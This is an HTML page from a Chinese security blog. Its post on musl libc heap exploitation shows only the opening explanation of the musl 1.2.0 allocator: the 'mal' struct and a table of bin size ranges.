<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2024/12/13/深入理解pwn_musl及相关例题/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="会当身由己，婉转入江湖">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解Pwn_musl及相关例题">
<meta property="og:url" content="https://jelasin.github.io/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="会当身由己，婉转入江湖">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/images/touxiang.jpg">
<meta property="article:published_time" content="2024-12-13T02:45:23.000Z">
<meta property="article:modified_time" content="2025-12-11T10:51:44.276Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/images/touxiang.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            深入理解Pwn_musl及相关例题 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/touxiang.jpg","description":"会当身由己，婉转入江湖"},"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"github":"https://github.com/jelasin","看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.5/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-xs">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://github.com/jelasin">
                                                    GITHUB
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://github.com/jelasin">GITHUB</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">135</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解Pwn_musl及相关例题</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-12-13 10:45:23</span>
        <span class="mobile">2024-12-13 10:45:23</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-12-11 18:51:44</span>
            <span class="mobile">2025-12-11 18:51:44</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Musl-heap-musl-1-2-0"><a href="#Musl-heap-musl-1-2-0" class="headerlink" title="Musl heap (musl-1.2.0)"></a>Musl heap (musl-1.2.0)</h1><p>本节例题以mips32架构为例：<a class="link"   target="_blank" rel="noopener" href="https://github.com/jelasin/MAPwn/tree/master/mips32%EF%BC%8C%E6%9C%AC%E8%8A%82%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%AE%B2%E8%A7%A3%E9%83%A8%E5%88%86%E4%BB%A5" >https://github.com/jelasin/MAPwn/tree/master/mips32，本节基础知识讲解部分以<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 64 位为例。</p>
<p>musl libc在内存分配上经历过一次大的改动（1.2.0-&gt;1.2.1），其余版本之间变化不大，这里以 1.2.0 版本为例进行分析。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/12/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_musl%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/4fd3cac91e50e4115e7bba510fb30cb0.png"
                     
                ></p>
<h3 id="mal"><a href="#mal" class="headerlink" title="mal"></a>mal</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint64_t</span> binmap;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></figure></div>

<p><code>mal</code> 结构体类似于 glibc 中的 <code>arena</code> ，记录着堆的状态，有三个成员：64位无符号整数 <code>binmap</code> ，链表头部数组 <code>bins</code> 和锁 <code>free_lock</code> 。</p>
<ul>
<li><p><code>binmap</code>记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。</p>
</li>
<li><p><code>bins[64]</code> 为 64 个 <code>chunk</code> 的链表头，分别维护 64 个存放空闲 <code>chunk</code> 的双向链表。每个下标对应的链表存放 <code>chunk</code> 的大小范围如下。</p>
<table>
<thead>
<tr>
<th>index</th>
<th>min size</th>
<th>max size (+0x1F)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x20</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x40</td>
<td>0x40</td>
</tr>
<tr>
<td>2</td>
<td>0x60</td>
<td>0x60</td>
</tr>
<tr>
<td>3</td>
<td>0x80</td>
<td>0x80</td>
</tr>
<tr>
<td>4</td>
<td>0xa0</td>
<td>0xa0</td>
</tr>
<tr>
<td>5</td>
<td>0xc0</td>
<td>0xc0</td>
</tr>
<tr>
<td>6</td>
<td>0xe0</td>
<td>0xe0</td>
</tr>
<tr>
<td>7</td>
<td>0x100</td>
<td>0x100</td>
</tr>
<tr>
<td>8</td>
<td>0x120</td>
<td>0x120</td>
</tr>
<tr>
<td>9</td>
<td>0x140</td>
<td>0x140</td>
</tr>
<tr>
<td>10</td>
<td>0x160</td>
<td>0x160</td>
</tr>
<tr>
<td>11</td>
<td>0x180</td>
<td>0x180</td>
</tr>
<tr>
<td>12</td>
<td>0x1a0</td>
<td>0x1a0</td>
</tr>
<tr>
<td>13</td>
<td>0x1c0</td>
<td>0x1c0</td>
</tr>
<tr>
<td>14</td>
<td>0x1e0</td>
<td>0x1e0</td>
</tr>
<tr>
<td>15</td>
<td>0x200</td>
<td>0x200</td>
</tr>
<tr>
<td>16</td>
<td>0x220</td>
<td>0x220</td>
</tr>
<tr>
<td>17</td>
<td>0x240</td>
<td>0x240</td>
</tr>
<tr>
<td>18</td>
<td>0x260</td>
<td>0x260</td>
</tr>
<tr>
<td>19</td>
<td>0x280</td>
<td>0x280</td>
</tr>
<tr>
<td>20</td>
<td>0x2a0</td>
<td>0x2a0</td>
</tr>
<tr>
<td>21</td>
<td>0x2c0</td>
<td>0x2c0</td>
</tr>
<tr>
<td>22</td>
<td>0x2e0</td>
<td>0x2e0</td>
</tr>
<tr>
<td>23</td>
<td>0x300</td>
<td>0x300</td>
</tr>
<tr>
<td>24</td>
<td>0x320</td>
<td>0x320</td>
</tr>
<tr>
<td>25</td>
<td>0x340</td>
<td>0x340</td>
</tr>
<tr>
<td>26</td>
<td>0x360</td>
<td>0x360</td>
</tr>
<tr>
<td>27</td>
<td>0x380</td>
<td>0x380</td>
</tr>
<tr>
<td>28</td>
<td>0x3a0</td>
<td>0x3a0</td>
</tr>
<tr>
<td>29</td>
<td>0x3c0</td>
<td>0x3c0</td>
</tr>
<tr>
<td>30</td>
<td>0x3e0</td>
<td>0x3e0</td>
</tr>
<tr>
<td>31</td>
<td>0x400</td>
<td>0x400</td>
</tr>
<tr>
<td>32</td>
<td>0x420</td>
<td>0x420</td>
</tr>
<tr>
<td>33</td>
<td>0x440</td>
<td>0x520</td>
</tr>
<tr>
<td>34</td>
<td>0x540</td>
<td>0x620</td>
</tr>
<tr>
<td>35</td>
<td>0x640</td>
<td>0x720</td>
</tr>
<tr>
<td>36</td>
<td>0x740</td>
<td>0x820</td>
</tr>
<tr>
<td>37</td>
<td>0x840</td>
<td>0xa20</td>
</tr>
<tr>
<td>38</td>
<td>0xa40</td>
<td>0xc20</td>
</tr>
<tr>
<td>39</td>
<td>0xc40</td>
<td>0xe20</td>
</tr>
<tr>
<td>40</td>
<td>0xe40</td>
<td>0x1020</td>
</tr>
<tr>
<td>41</td>
<td>0x1040</td>
<td>0x1420</td>
</tr>
<tr>
<td>42</td>
<td>0x1440</td>
<td>0x1820</td>
</tr>
<tr>
<td>43</td>
<td>0x1840</td>
<td>0x1c20</td>
</tr>
<tr>
<td>44</td>
<td>0x1c40</td>
<td>0x2020</td>
</tr>
<tr>
<td>45</td>
<td>0x2040</td>
<td>0x2820</td>
</tr>
<tr>
<td>46</td>
<td>0x2840</td>
<td>0x3020</td>
</tr>
<tr>
<td>47</td>
<td>0x3040</td>
<td>0x3820</td>
</tr>
<tr>
<td>48</td>
<td>0x3840</td>
<td>0x4020</td>
</tr>
<tr>
<td>49</td>
<td>0x4040</td>
<td>0x5020</td>
</tr>
<tr>
<td>50</td>
<td>0x5040</td>
<td>0x6020</td>
</tr>
<tr>
<td>51</td>
<td>0x6040</td>
<td>0x7020</td>
</tr>
<tr>
<td>52</td>
<td>0x7040</td>
<td>0x8020</td>
</tr>
<tr>
<td>53</td>
<td>0x8040</td>
<td>0xa020</td>
</tr>
<tr>
<td>54</td>
<td>0xa040</td>
<td>0xc020</td>
</tr>
<tr>
<td>55</td>
<td>0xc040</td>
<td>0xe020</td>
</tr>
<tr>
<td>56</td>
<td>0xe040</td>
<td>0x10020</td>
</tr>
<tr>
<td>57</td>
<td>0x10040</td>
<td>0x14020</td>
</tr>
<tr>
<td>58</td>
<td>0x14040</td>
<td>0x18020</td>
</tr>
<tr>
<td>59</td>
<td>0x18040</td>
<td>0x1c020</td>
</tr>
<tr>
<td>60</td>
<td>0x1c040</td>
<td>0x20020</td>
</tr>
<tr>
<td>61</td>
<td>0x20040</td>
<td>0x28020</td>
</tr>
<tr>
<td>62</td>
<td>0x28040</td>
<td>0x30020</td>
</tr>
<tr>
<td>63</td>
<td>0x30040</td>
<td>0x38000</td>
</tr>
</tbody></table>
</li>
</ul>
